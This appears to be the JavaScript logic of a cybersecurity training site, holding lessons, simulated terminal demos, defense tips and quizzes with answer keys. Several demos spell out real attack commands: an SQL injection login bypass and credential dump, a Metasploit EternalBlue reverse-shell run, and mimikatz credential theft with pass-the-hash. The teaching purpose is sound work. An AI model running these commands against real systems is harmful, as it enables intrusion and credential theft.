/* ============================================================
   LEARN.JS — Learning Center Module Logic
   Cyber Attack Simulation LAB
   ============================================================ */

'use strict';

/* ── Learning Modules Database ── */
const LEARNING_MODULES = {
  beginner: {
    color: '#00ff88', name: 'Beginner', ar: 'مبتدئ',
    modules: [
      {
        id: 'b1', title: 'What is Cybersecurity?', type: 'Theory', xp: 50, duration: '8 min',
        theory: {
          content: `
            <h3>Introduction to Cybersecurity</h3>
            <p>Cybersecurity is the practice of protecting systems, networks, and programs from digital attacks. These attacks are usually aimed at accessing, changing, or destroying sensitive information, extorting money from users, or interrupting normal business processes.</p>
            <p>In today's interconnected world, cybersecurity is more important than ever. Every organization, from small businesses to large enterprises, needs to protect its digital assets.</p>
            <h3>The CIA Triad</h3>
            <p>The foundation of cybersecurity is built on three core principles:</p>
            <ul>
              <li><strong style="color:#00d4ff">Confidentiality</strong> — Ensuring data is only accessible to authorized parties</li>
              <li><strong style="color:#ff3366">Integrity</strong> — Ensuring data hasn't been tampered with</li>
              <li><strong style="color:#00ff88">Availability</strong> — Ensuring systems are accessible when needed</li>
            </ul>
            <h3>Types of Cyber Threats</h3>
            <ul>
              <li>Malware (viruses, ransomware, trojans)</li>
              <li>Phishing and social engineering</li>
              <li>Man-in-the-middle attacks</li>
              <li>Denial-of-service attacks</li>
              <li>SQL injection and code injection</li>
            </ul>
          `,
          diagram: { attacker: '👤 Hacker', target: '🏢 Organization', defender: '🛡️ Security' }
        },
        demo: {
          title: 'Basic Network Scan',
          steps: [
            { cmd: 'nmap -sV 192.168.1.1', out: 'Starting Nmap scan on host 192.168.1.1', type: 'info' },
            { cmd: null, out: 'Scanning ports 1-1000...', type: 'info' },
            { cmd: null, out: 'PORT    STATE SERVICE  VERSION', type: 'output' },
            { cmd: null, out: '22/tcp  open  ssh      OpenSSH 8.2', type: 'success' },
            { cmd: null, out: '80/tcp  open  http     Apache 2.4.41', type: 'success' },
            { cmd: null, out: '443/tcp open  ssl/http  Nginx 1.18', type: 'success' },
            { cmd: null, out: 'Nmap done: 1 IP address (1 host up) scanned in 3.42s', type: 'info' },
          ]
        },
        defense: `
          <h3>How to Defend</h3>
          <p>Basic cybersecurity hygiene includes:</p>
          <ul>
            <li>🔐 Use strong, unique passwords for every account</li>
            <li>🔄 Keep all software and systems updated</li>
            <li>🛡️ Enable multi-factor authentication (MFA)</li>
            <li>🔥 Configure and maintain firewalls</li>
            <li>📋 Regularly audit access logs</li>
            <li>🎓 Educate users about phishing attacks</li>
          </ul>
        `,
        quiz: [
          {
            q: 'What does the "I" in CIA Triad stand for?',
            opts: ['Intelligence', 'Integrity', 'Identity', 'Infrastructure'],
            ans: 1
          },
          {
            q: 'Which type of attack overwhelms a server with traffic?',
            opts: ['Phishing', 'SQL Injection', 'DDoS', 'Man-in-the-Middle'],
            ans: 2
          }
        ]
      },
      {
        id: 'b2', title: 'Understanding Malware', type: 'Theory', xp: 60, duration: '10 min',
        theory: {
          content: `
            <h3>What is Malware?</h3>
            <p>Malware (malicious software) is any software intentionally designed to cause disruption to a computer, server, client, or computer network, leak private information, gain unauthorized access to information or systems, deprive users access to information, or unknowingly interfere with the user's computer security and privacy.</p>
            <h3>Types of Malware</h3>
            <ul>
              <li><strong style="color:#ff3366">Virus</strong> — Self-replicating code that attaches to legitimate programs</li>
              <li><strong style="color:#ffaa00">Ransomware</strong> — Encrypts files and demands payment</li>
              <li><strong style="color:#00d4ff">Trojan</strong> — Appears legitimate but contains malicious code</li>
              <li><strong style="color:#a78bfa">Spyware</strong> — Secretly monitors user activity</li>
              <li><strong style="color:#00ff88">Worm</strong> — Self-replicates across networks without user action</li>
              <li><strong style="color:#ff6b35">Rootkit</strong> — Hides malicious activity from the operating system</li>
            </ul>
            <h3>How Malware Spreads</h3>
            <ul>
              <li>Email attachments and links</li>
              <li>Infected USB drives</li>
              <li>Drive-by downloads from compromised websites</li>
              <li>Social engineering and phishing</li>
              <li>Unpatched software vulnerabilities</li>
            </ul>
          `,
          diagram: { attacker: '💻 Infected File', target: '👤 Victim', defender: '🦠 AV Scanner' }
        },
        demo: {
          title: 'Malware Analysis Simulation',
          steps: [
            { cmd: 'file suspicious.exe', out: 'suspicious.exe: PE32+ executable (GUI) x86-64', type: 'output' },
            { cmd: 'strings suspicious.exe | grep -i "http"', out: 'http://malware-c2.xyz/beacon', type: 'warning' },
            { cmd: 'sha256sum suspicious.exe', out: 'a8f9c2e1b4d7...  suspicious.exe', type: 'output' },
            { cmd: null, out: '[!] Hash matches known Emotet variant', type: 'error' },
            { cmd: null, out: '[!] C2 Server: malware-c2.xyz — BLOCK IMMEDIATELY', type: 'error' },
          ]
        },
        defense: `
          <h3>Anti-Malware Defense Strategy</h3>
          <ul>
            <li>🛡️ Install reputable antivirus/EDR software</li>
            <li>📧 Never open suspicious email attachments</li>
            <li>🔄 Keep OS and applications updated</li>
            <li>💾 Maintain offline backups (3-2-1 rule)</li>
            <li>🌐 Use DNS filtering to block malicious domains</li>
            <li>🔒 Implement application whitelisting</li>
          </ul>
        `,
        quiz: [
          { q: 'Which malware encrypts your files and demands payment?', opts: ['Virus', 'Worm', 'Ransomware', 'Spyware'], ans: 2 },
          { q: 'What is the 3-2-1 backup rule?', opts: ['3 backups daily', '3 copies, 2 media types, 1 offsite', '3 layers of encryption', 'None of the above'], ans: 1 }
        ]
      },
      {
        id: 'b3', title: 'Social Engineering', type: 'Theory', xp: 70, duration: '12 min',
        theory: { content: `<h3>What is Social Engineering?</h3><p>Social engineering is the psychological manipulation of people into performing actions or divulging confidential information. It relies on human error rather than technical vulnerabilities.</p><h3>Common Techniques</h3><ul><li><strong style="color:#ff3366">Phishing</strong> — Mass deceptive emails</li><li><strong style="color:#ffaa00">Spear Phishing</strong> — Targeted phishing attacks</li><li><strong style="color:#00d4ff">Vishing</strong> — Voice/phone-based phishing</li><li><strong style="color:#a78bfa">Baiting</strong> — Leaving infected USB drives</li><li><strong style="color:#00ff88">Pretexting</strong> — Creating false scenarios</li></ul>`, diagram: { attacker: '📧 Phisher', target: '👤 Employee', defender: '🧠 Awareness' } },
        demo: { title: 'Phishing Email Analysis', steps: [{ cmd: 'Analyzing email headers...', out: 'From: security@paypa1.com (spoofed)', type: 'warning' },{ cmd: null, out: 'Reply-To: hacker@evil.ru', type: 'error' },{ cmd: null, out: 'Links redirect to: phish.xyz/login', type: 'error' },{ cmd: null, out: '[VERDICT] PHISHING — Do NOT click any links', type: 'error' }] },
        defense: `<h3>Defense Against Social Engineering</h3><ul><li>🎓 Security awareness training for all staff</li><li>✅ Verify identity before sharing information</li><li>📧 Use email filtering and anti-phishing tools</li><li>🔐 Enable MFA on all critical accounts</li></ul>`,
        quiz: [{ q: 'What is spear phishing?', opts: ['Fishing in the ocean', 'Mass phishing emails', 'Targeted phishing against specific individuals', 'Voice phishing'], ans: 2 }]
      }
    ]
  },

  intermediate: {
    color: '#00d4ff', name: 'Intermediate', ar: 'متوسط',
    modules: [
      {
        id: 'i1', title: 'Network Scanning & Recon', type: 'Hands-On', xp: 100, duration: '15 min',
        theory: { content: `<h3>Reconnaissance Phase</h3><p>Reconnaissance (recon) is the first phase of the cyber kill chain. Attackers gather information about a target before launching an attack. This includes identifying open ports, running services, OS versions, and potential vulnerabilities.</p><h3>Tools Used</h3><ul><li><strong style="color:#00d4ff">Nmap</strong> — Network discovery and security auditing</li><li><strong style="color:#00ff88">Shodan</strong> — Search engine for internet-connected devices</li><li><strong style="color:#ffaa00">Maltego</strong> — Open source intelligence (OSINT)</li><li><strong style="color:#a78bfa">Recon-ng</strong> — Web reconnaissance framework</li></ul>`, diagram: { attacker: '🔍 Scanner', target: '🌐 Network', defender: '🚫 IDS/IPS' } },
        demo: { title: 'Nmap Network Scan', steps: [
          { cmd: 'nmap -sS -O -A 192.168.1.0/24', out: 'Starting aggressive scan on subnet...', type: 'info' },
          { cmd: null, out: 'Host: 192.168.1.10  Status: Up', type: 'success' },
          { cmd: null, out: '22/tcp  open  ssh     OpenSSH 8.2 (Ubuntu)', type: 'output' },
          { cmd: null, out: '80/tcp  open  http    Apache httpd 2.4.41', type: 'output' },
          { cmd: null, out: '3306/tcp open  mysql  MySQL 8.0.26', type: 'warning' },
          { cmd: null, out: 'OS: Linux 5.4 (Ubuntu 20.04)', type: 'output' },
          { cmd: null, out: '[!] MySQL exposed on public interface!', type: 'error' },
        ]},
        defense: `<h3>Defending Against Recon</h3><ul><li>🔥 Implement strict firewall rules — close unused ports</li><li>🕵️ Deploy IDS/IPS to detect scanning activity</li><li>🌐 Use network segmentation</li><li>📊 Monitor network traffic for anomalies</li><li>🚫 Never expose database ports publicly</li></ul>`,
        quiz: [{ q: 'Which port is SSH typically running on?', opts: ['21', '22', '80', '443'], ans: 1 }, { q: 'What does -sS flag do in Nmap?', opts: ['Full connect scan', 'SYN stealth scan', 'UDP scan', 'Version detection'], ans: 1 }]
      },
      {
        id: 'i2', title: 'SQL Injection Attack', type: 'Hands-On', xp: 120, duration: '20 min',
        theory: { content: `<h3>What is SQL Injection?</h3><p>SQL Injection (SQLi) is one of the most critical web application vulnerabilities. An attacker inserts malicious SQL code into input fields that gets executed by the database server, potentially exposing, modifying, or deleting data.</p><h3>Types of SQL Injection</h3><ul><li><strong style="color:#ff3366">In-band SQLi</strong> — Same channel for attack and data retrieval</li><li><strong style="color:#ffaa00">Blind SQLi</strong> — No data returned, inferred from behavior</li><li><strong style="color:#00d4ff">Out-of-band SQLi</strong> — Uses alternative channels (DNS, HTTP)</li></ul><h3>Common Payloads</h3>`, diagram: { attacker: '💉 Injector', target: '🗄️ Database', defender: '🧱 WAF' } },
        demo: { title: 'SQL Injection Demo', steps: [
          { cmd: "Testing: ' OR '1'='1", out: 'Sending payload to login form...', type: 'info' },
          { cmd: null, out: 'URL: /login?user=admin%27+OR+%271%27%3D%271', type: 'output' },
          { cmd: null, out: 'Response: 200 OK — Login Successful!', type: 'warning' },
          { cmd: null, out: '[!] Authentication Bypass — VULNERABLE!', type: 'error' },
          { cmd: "' UNION SELECT username,password FROM users--", out: 'Dumping credentials...', type: 'error' },
          { cmd: null, out: 'admin:$2b$12$hash...  | user:$2b$10$hash...', type: 'error' },
          { cmd: null, out: '[CRITICAL] Database fully compromised!', type: 'error' },
        ]},
        defense: `<h3>Preventing SQL Injection</h3><ul><li>✅ Use parameterized queries / prepared statements</li><li>🧱 Deploy a Web Application Firewall (WAF)</li><li>🔐 Apply principle of least privilege to DB users</li><li>🚫 Never expose raw errors to end users</li><li>📝 Validate and sanitize ALL user inputs</li></ul>`,
        quiz: [{ q: 'What is the main defense against SQL Injection?', opts: ['Firewall', 'Parameterized queries', 'Antivirus', 'VPN'], ans: 1 }]
      }
    ]
  },

  advanced: {
    color: '#ffaa00', name: 'Advanced', ar: 'قوي',
    modules: [
      {
        id: 'a1', title: 'Metasploit Framework', type: 'Lab', xp: 200, duration: '25 min',
        theory: { content: `<h3>What is Metasploit?</h3><p>Metasploit is the world's most widely used penetration testing framework. It provides a comprehensive library of exploits, payloads, encoders, and auxiliary modules for security testing and vulnerability research.</p><h3>Core Concepts</h3><ul><li><strong style="color:#ff3366">Exploits</strong> — Code that takes advantage of vulnerabilities</li><li><strong style="color:#ffaa00">Payloads</strong> — Code that runs on target after exploitation</li><li><strong style="color:#00d4ff">Meterpreter</strong> — Advanced in-memory payload</li><li><strong style="color:#a78bfa">Post Modules</strong> — Post-exploitation actions</li></ul>`, diagram: { attacker: '⚔️ Metasploit', target: '💀 Target', defender: '🔍 EDR' } },
        demo: { title: 'Metasploit Session', steps: [
          { cmd: 'msfconsole', out: 'Metasploit Framework v6.3.25', type: 'info' },
          { cmd: 'search eternalblue', out: 'Found: exploit/windows/smb/ms17_010_eternalblue', type: 'output' },
          { cmd: 'use exploit/windows/smb/ms17_010_eternalblue', out: 'Module selected successfully', type: 'success' },
          { cmd: 'set RHOSTS 192.168.1.50', out: 'RHOSTS => 192.168.1.50', type: 'output' },
          { cmd: 'set PAYLOAD windows/x64/meterpreter/reverse_tcp', out: 'PAYLOAD set', type: 'output' },
          { cmd: 'exploit', out: '[*] Sending exploit... [*] Meterpreter session 1 opened', type: 'warning' },
          { cmd: null, out: 'meterpreter > getuid → NT AUTHORITY\\SYSTEM', type: 'error' },
        ]},
        defense: `<h3>Defending Against Exploitation</h3><ul><li>🔄 Apply security patches IMMEDIATELY (EternalBlue targets unpatched MS17-010)</li><li>🔥 Disable unnecessary services (SMBv1)</li><li>🕵️ Deploy Endpoint Detection & Response (EDR)</li><li>🌐 Network segmentation to limit lateral movement</li><li>👁️ Enable Windows Event Logging</li></ul>`,
        quiz: [{ q: 'What vulnerability does EternalBlue exploit?', opts: ['Apache RCE', 'SMB MS17-010', 'Log4Shell', 'Heartbleed'], ans: 1 }]
      }
    ]
  },

  expert: {
    color: '#ff3366', name: 'Expert', ar: 'خبير',
    modules: [
      {
        id: 'e1', title: 'APT Attack Lifecycle', type: 'Advanced Lab', xp: 350, duration: '35 min',
        theory: { content: `<h3>Advanced Persistent Threats (APTs)</h3><p>APTs are sophisticated, multi-stage cyber attacks conducted by well-resourced threat actors (often nation-states) who gain unauthorized access and remain undetected for extended periods.</p><h3>The APT Kill Chain</h3><ul><li><strong style="color:#ff3366">1. Recon</strong> — Intelligence gathering on target organization</li><li><strong style="color:#ff6b35">2. Weaponization</strong> — Creating malicious payloads</li><li><strong style="color:#ffaa00">3. Delivery</strong> — Spear phishing, watering holes, supply chain</li><li><strong style="color:#a78bfa">4. Exploitation</strong> — Zero-day or known CVE exploitation</li><li><strong style="color:#00d4ff">5. Installation</strong> — Backdoor/implant installation</li><li><strong style="color:#00ff88">6. C2</strong> — Command and control establishment</li><li><strong style="color:#e6edf3">7. Exfiltration</strong> — Data theft, objective execution</li></ul>`, diagram: { attacker: '🎭 APT Group', target: '🏛️ Critical Infra', defender: '🔬 Threat Hunt' } },
        demo: { title: 'APT Simulation — Lateral Movement', steps: [
          { cmd: 'mimikatz # privilege::debug', out: 'Privilege::Debug enabled', type: 'warning' },
          { cmd: 'sekurlsa::logonpasswords', out: 'Extracting credentials from LSASS...', type: 'error' },
          { cmd: null, out: 'Username: domain_admin | NTLM: aad3b435b51404eeaad3b435b51404ee', type: 'error' },
          { cmd: 'impacket-psexec domain_admin@192.168.1.100 -hashes :aad3b...', out: 'Pass-the-Hash attack...', type: 'error' },
          { cmd: null, out: '[*] Shell on DC01 obtained as DOMAIN\\domain_admin', type: 'error' },
          { cmd: null, out: '[CRITICAL] Domain Controller Compromised — Full network access', type: 'error' },
        ]},
        defense: `<h3>APT Defense Strategy</h3><ul><li>🔍 Implement threat hunting programs</li><li>🧅 Zero Trust Architecture — never trust, always verify</li><li>🔐 Privileged Access Management (PAM)</li><li>📊 SIEM with behavioral analytics (UEBA)</li><li>🔴 Red team/blue team exercises regularly</li><li>📡 Deception technology (honeypots)</li><li>🔒 Credential Guard to protect LSASS</li></ul>`,
        quiz: [{ q: 'What technique does Pass-the-Hash exploit?', opts: ['SQL vulnerabilities', 'NTLM authentication weakness', 'WPA2 handshake', 'Buffer overflow'], ans: 1 }]
      }
    ]
  }
};

/* ── Learn Page Controller ── */
const LearnPage = {
  currentLevel: 'beginner',
  currentModule: 0,
  currentTab: 'theory',
  currentQuizQ: 0,
  quizAnswers: [],
  userProgress: {},

  init() {
    const user = Nav.init();
    if (!user) return;
    this.userProgress = Utils.storage.get('progress', {});
    this.renderLevelCards();
    this.loadLevel('beginner');
  },

  renderLevelCards() {
    const levels = ['beginner', 'intermediate', 'advanced', 'expert'];
    levels.forEach((lvl, i) => {
      const card = document.getElementById(`level-card-${lvl}`);
      if (!card) return;

      const data = LEARNING_MODULES[lvl];
      const total = data.modules.length;
      const done  = data.modules.filter(m => this.userProgress[m.id]).length;
      const pct   = total > 0 ? Math.round((done / total) * 100) : 0;

      const fill = card.querySelector('.level-progress-fill');
      const pctEl = card.querySelector('.level-pct');
      const modEl = card.querySelector('.level-mod-count');
      if (fill)  fill.style.width = pct + '%';
      if (pctEl) pctEl.textContent = pct + '%';
      if (modEl) modEl.textContent = `${done}/${total} modules`;

      card.addEventListener('click', () => {
        document.querySelectorAll('.level-card').forEach(c => c.classList.remove('active'));
        card.classList.add('active');
        this.loadLevel(lvl);
      });
    });
  },

  loadLevel(level) {
    this.currentLevel = level;
    this.currentModule = 0;
    this.renderModuleSidebar();
    this.loadModule(0);
  },

  renderModuleSidebar() {
    const list = document.getElementById('module-list');
    if (!list) return;
    list.innerHTML = '';

    const data = LEARNING_MODULES[this.currentLevel];
    data.modules.forEach((mod, i) => {
      const done   = this.userProgress[mod.id];
      const isLocked = i > 0 && !this.userProgress[data.modules[i-1].id];

      const item = Utils.el('div', {
        class: `module-item ${done ? 'completed' : ''} ${i === this.currentModule ? 'active' : ''} ${isLocked ? 'locked' : ''}`,
        id: `mod-item-${i}`
      }, [
        Utils.el('div', { class: 'module-item-icon', text: done ? '✅' : isLocked ? '🔒' : '📖' }),
        Utils.el('div', { class: 'module-item-info' }, [
          Utils.el('div', { class: 'module-item-name', text: mod.title }),
          Utils.el('div', { class: 'module-item-type', text: `${mod.type} · ${mod.duration} · +${mod.xp} XP` })
        ]),
        Utils.el('div', { class: `module-check`, text: done ? '✓' : '' })
      ]);

      if (!isLocked) {
        item.addEventListener('click', () => this.loadModule(i));
      }
      list.appendChild(item);
    });
  },

  loadModule(index) {
    this.currentModule = index;
    this.currentQuizQ  = 0;
    this.quizAnswers   = [];

    const data = LEARNING_MODULES[this.currentLevel];
    const mod  = data.modules[index];
    if (!mod) return;

    // Update sidebar active state
    Utils.qsa('.module-item').forEach((item, i) => {
      item.classList.toggle('active', i === index);
    });

    // Update breadcrumb
    const bc = document.getElementById('module-breadcrumb');
    if (bc) bc.innerHTML = `${data.name} <span>›</span> ${mod.type}`;

    // Update title
    const title = document.getElementById('module-title');
    if (title) title.textContent = mod.title;

    // Update meta
    const meta = document.getElementById('module-meta');
    if (meta) {
      meta.innerHTML = `
        <span class="module-meta-item">⏱ ${mod.duration}</span>
        <span class="module-meta-item">⚡ +${mod.xp} XP</span>
        <span class="module-meta-item">📂 ${mod.type}</span>
      `;
    }

    // Render content
    this.renderTheory(mod);
    this.renderDemo(mod);
    this.renderDefense(mod);
    this.renderQuiz(mod);
    this.switchTab('theory');
  },

  renderTheory(mod) {
    const panel = document.getElementById('panel-theory');
    if (!panel) return;

    const { content, diagram } = mod.theory;

    panel.innerHTML = `
      <div class="theory-content">${content}</div>
      <div class="attack-diagram">
        <div class="diagram-node attacker">
          <div class="node-icon">💻</div>
          <div class="node-label">${diagram.attacker}</div>
        </div>
        <div class="diagram-arrow">→→→</div>
        <div class="diagram-node target">
          <div class="node-icon">🎯</div>
          <div class="node-label">${diagram.target}</div>
        </div>
        <div class="diagram-arrow">←←←</div>
        <div class="diagram-node defender">
          <div class="node-icon">🛡️</div>
          <div class="node-label">${diagram.defender}</div>
        </div>
      </div>
    `;
  },

  renderDemo(mod) {
    const panel = document.getElementById('panel-demo');
    if (!panel) return;

    const { title, steps } = mod.demo;
    panel.innerHTML = `
      <div class="demo-terminal">
        <div class="terminal-header">
          <div class="terminal-dot red"></div>
          <div class="terminal-dot yellow"></div>
          <div class="terminal-dot green"></div>
          <div class="terminal-title">${title} — Educational Simulation</div>
        </div>
        <div class="terminal-body" id="demo-terminal-body">
          <div class="terminal-line">
            <span class="terminal-prompt">root@kali:~$</span>
            <span class="terminal-cursor"></span>
          </div>
        </div>
        <div class="terminal-controls">
          <button class="btn btn-danger btn-sm" onclick="LearnPage.runDemo()">▶ Run Simulation</button>
          <button class="btn btn-ghost btn-sm" onclick="LearnPage.clearTerminal()">🗑 Clear</button>
        </div>
      </div>
    `;
    this._currentSteps = steps;
  },

  clearTerminal() {
    const body = document.getElementById('demo-terminal-body');
    if (body) body.innerHTML = '<div class="terminal-line"><span class="terminal-prompt">root@kali:~$</span> <span class="terminal-cursor"></span></div>';
  },

  async runDemo() {
    const body = document.getElementById('demo-terminal-body');
    if (!body || !this._currentSteps) return;
    body.innerHTML = '';

    for (const step of this._currentSteps) {
      await new Promise(r => setTimeout(r, 400));
      const line = document.createElement('div');
      line.className = 'terminal-line';

      if (step.cmd) {
        line.innerHTML = `<span class="terminal-prompt">root@kali:~$</span> <span class="terminal-cmd"></span>`;
        body.appendChild(line);
        const cmdEl = line.querySelector('.terminal-cmd');
        await new Promise(r => {
          let i = 0;
          const t = setInterval(() => {
            cmdEl.textContent += step.cmd[i++];
            body.scrollTop = body.scrollHeight;
            if (i >= step.cmd.length) { clearInterval(t); r(); }
          }, 30);
        });
      } else {
        line.innerHTML = `<span class="terminal-output ${step.type}">${step.out}</span>`;
        body.appendChild(line);
      }

      if (step.out && step.cmd) {
        await new Promise(r => setTimeout(r, 300));
        const outLine = document.createElement('div');
        outLine.className = 'terminal-line';
        outLine.innerHTML = `<span class="terminal-output ${step.type}">${step.out}</span>`;
        body.appendChild(outLine);
      }

      body.scrollTop = body.scrollHeight;
    }

    // Add cursor back
    const cursor = document.createElement('div');
    cursor.className = 'terminal-line';
    cursor.innerHTML = '<span class="terminal-prompt">root@kali:~$</span> <span class="terminal-cursor"></span>';
    body.appendChild(cursor);
  },

  renderDefense(mod) {
    const panel = document.getElementById('panel-defense');
    if (!panel) return;
    panel.innerHTML = `<div class="theory-content">${mod.defense}</div>`;
  },

  renderQuiz(mod) {
    const panel = document.getElementById('panel-quiz');
    if (!panel || !mod.quiz?.length) return;

    this.currentQuizQ = 0;
    this.quizAnswers  = [];
    this.renderQuestion(mod, panel);
  },

  renderQuestion(mod, panel) {
    const q     = mod.quiz[this.currentQuizQ];
    const total = mod.quiz.length;
    if (!q) { this.showQuizResult(mod, panel); return; }

    panel.innerHTML = `
      <div class="quiz-container">
        <div class="quiz-progress">
          <span class="text-sm text-secondary">Question ${this.currentQuizQ + 1} of ${total}</span>
          <span class="badge badge-blue">+${Math.round(mod.xp / total)} XP per question</span>
        </div>
        <div class="progress-bar mb-6"><div class="progress-fill" style="width:${(this.currentQuizQ/total)*100}%"></div></div>
        <div class="quiz-question">${q.q}</div>
        <div class="quiz-options">
          ${q.opts.map((opt, i) => `
            <button class="quiz-option" id="qopt-${i}" onclick="LearnPage.selectAnswer(${i}, ${q.ans}, '${mod.id}')">
              <span class="quiz-option-letter">${'ABCD'[i]}</span>
              <span class="quiz-option-text">${opt}</span>
            </button>
          `).join('')}
        </div>
      </div>
    `;
  },

  selectAnswer(chosen, correct, modId) {
    Utils.qsa('.quiz-option').forEach(b => b.disabled = true);
    const buttons = Utils.qsa('.quiz-option');
    buttons[chosen].classList.add(chosen === correct ? 'correct' : 'wrong');
    if (chosen !== correct) buttons[correct].classList.add('correct');

    this.quizAnswers.push(chosen === correct);

    setTimeout(() => {
      this.currentQuizQ++;
      const data = LEARNING_MODULES[this.currentLevel];
      const mod  = data.modules[this.currentModule];
      const panel = document.getElementById('panel-quiz');
      if (panel) this.renderQuestion(mod, panel);
    }, 1200);
  },

  showQuizResult(mod, panel) {
    const correct = this.quizAnswers.filter(Boolean).length;
    const total   = mod.quiz.length;
    const pct     = Math.round((correct / total) * 100);
    const passed  = pct >= 60;

    if (passed && !this.userProgress[mod.id]) {
      this.userProgress[mod.id] = true;
      Utils.storage.set('progress', this.userProgress);
      const user = Auth.getUser();
      if (user) {
        user.xp = (user.xp || 0) + mod.xp;
        const users = Utils.storage.get('users', []);
        const idx   = users.findIndex(u => u.id === user.id);
        if (idx >= 0) { users[idx] = user; Utils.storage.set('users', users); }
        Auth.login(user);
      }
      this.showXpToast(mod.xp);
      this.renderModuleSidebar();
      this.renderLevelCards();
    }

    panel.innerHTML = `
      <div class="quiz-container" style="text-align:center; padding: 40px 20px">
        <div style="font-size:64px; margin-bottom:16px">${passed ? '🎉' : '😔'}</div>
        <h2 style="font-size:28px; margin-bottom:8px; color:${passed ? 'var(--defense-green)' : 'var(--attack-red)'}">${passed ? 'Passed!' : 'Try Again'}</h2>
        <p style="font-size:18px; color:var(--text-secondary); margin-bottom:24px">${correct}/${total} correct — ${pct}%</p>
        ${passed ? `<div class="badge badge-green" style="font-size:14px;padding:8px 20px;margin:0 auto 24px;display:inline-flex">+${mod.xp} XP Earned!</div>` : ''}
        <div style="display:flex;gap:12px;justify-content:center;flex-wrap:wrap">
          <button class="btn btn-ghost" onclick="LearnPage.loadModule(${this.currentModule})">🔄 Retry</button>
          ${passed && this.currentModule < LEARNING_MODULES[this.currentLevel].modules.length - 1 
            ? `<button class="btn btn-primary" onclick="LearnPage.loadModule(${this.currentModule + 1})">Next Module →</button>` 
            : ''}
        </div>
      </div>
    `;
  },

  showXpToast(xp) {
    const toast = document.createElement('div');
    toast.className = 'xp-toast';
    toast.innerHTML = `<span style="font-size:24px">⚡</span><div><div style="font-weight:700;font-size:15px">+${xp} XP Earned!</div><div style="font-size:12px;opacity:0.8">Module Completed</div></div>`;
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 3100);
  },

  switchTab(tab) {
    this.currentTab = tab;
    Utils.qsa('.content-tab').forEach(t => t.classList.toggle('active', t.dataset.tab === tab));
    Utils.qsa('.content-panel').forEach(p => p.classList.toggle('active', p.id === `panel-${tab}`));
  }
};

document.addEventListener('DOMContentLoaded', () => {
  if (window.location.pathname.includes('learn')) {
    LearnPage.init();
    window.LearnPage = LearnPage;
  }
});
